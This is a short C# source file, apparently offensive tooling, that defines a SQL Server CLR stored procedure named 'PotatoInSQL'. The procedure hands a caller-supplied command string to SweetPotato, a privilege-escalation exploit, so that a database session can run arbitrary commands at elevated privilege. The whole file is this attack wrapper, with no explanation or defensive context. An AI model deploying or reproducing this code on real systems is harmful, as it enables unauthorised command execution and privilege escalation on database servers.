using System;
using System.Data;
using System.Data.SqlClient;
using System.Data.SqlTypes;
using Microsoft.SqlServer.Server;

public partial class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void PotatoInSQL(string cmd)
    {
        SweetPotato.Program.OriginMain(cmd);
    }
}
